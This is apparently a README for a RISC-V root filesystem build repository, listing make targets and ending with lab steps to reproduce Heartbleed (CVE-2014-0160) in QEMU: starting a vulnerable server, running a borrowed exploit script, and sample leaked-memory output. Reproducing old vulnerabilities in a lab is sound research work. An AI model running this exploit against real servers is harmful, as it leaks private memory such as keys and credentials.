# Rootfs

## Introduction

This repository automates the process of setting up and managing a root filesystem (`rootfs`) with the necessary applications.

## Prerequisites

First, set the environment variables `RISCV` and `RISCV_ROOTFS_HOME`:

- `RISCV`: The top directory of your RISC-V toolchain binaries, such as `/opt/riscv`
- `RISCV_ROOTFS_HOME`: The top directory of this cloned repository

## Usage

### Initialization

Before building the `rootfs`, initialize the required git submodules:

```bash
make init
```

This command updates and initializes the submodules with a shallow clone (`--depth 1`).

### Building the Rootfs

To build the `rootfs`, run:

```bash
make all
```

This target compiles and installs the specified applications (in this case, `busybox`) and generates the initial RAM filesystem (`initramfs`) using a Python script located in the `utils` directory.

### Cleaning the Rootfs

To clean the build artifacts and directories, use:

```bash
make clean
```

This command cleans up the build directories of the specified applications and removes any generated `initramfs` files from the `rootfsimg` directory.

### Cleaning submodules

To remove all generated files inside submodules, run:

```bash
make repoclean
```

This command not only initiates a `make clean` operation but also extends its reach to clean up any generated files residing within the submodules.

### Deinitialization

To deinitialize and remove all git submodules, run:

```bash
make distclean
```

This command forcefully deinitializes all submodules, which is useful when you are about to switch git branches.

### Generating initramfs manually

To manually generate initramfs.txt, use:

```bash
make initramfs
```

This command is particularly useful when you need to modify or update the rootfsimg either after `make all` or independently of it.

### Steps to reproduce heartbleed (CVE-2014-0160)

To reproduce the heartbleed vulnerability identified as CVE-2014-0160, follow these detailed steps:

**1. Launch the Vulnerable Server**

- On the remote machine (e.g., QEMU virtual machine), after haveged initializes /dev/urandom, execute:

     ```bash
     /root/hb-server 443 /root/cert.crt /root/rsa_private.key &
     ```

**2. Execute the Heartbleed Exploit**

#### Option A: From Host Machine (with port forwarding)

- When using QEMU with port forwarding (host:10023 → guest:443):

- On the host machine, execute the Python script in 'utils' directory:

    ```bash
    python utils/heartbleed.py 127.0.0.1 -p 10023
    ```

#### Option B: From Guest Machine (localhost)

- To test locally on the remote machine:

    ```bash
    /scripts/heartbleed-localhost.sh
    ```

**3. Observe the Results**

- Upon successful execution, you should observe output similar to the following:

```text
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 58
 ... received message: type = 22, ver = 0302, length = 895
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  [... truncated for brevity ...]
  3ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

WARNING: server returned more data than it should - server is vulnerable!
```

## Reference

* The heartbleed python script is not self-made, and the original code can be found in [akshatmittal's GitHub Gist](https://gist.github.com/akshatmittal/10279360)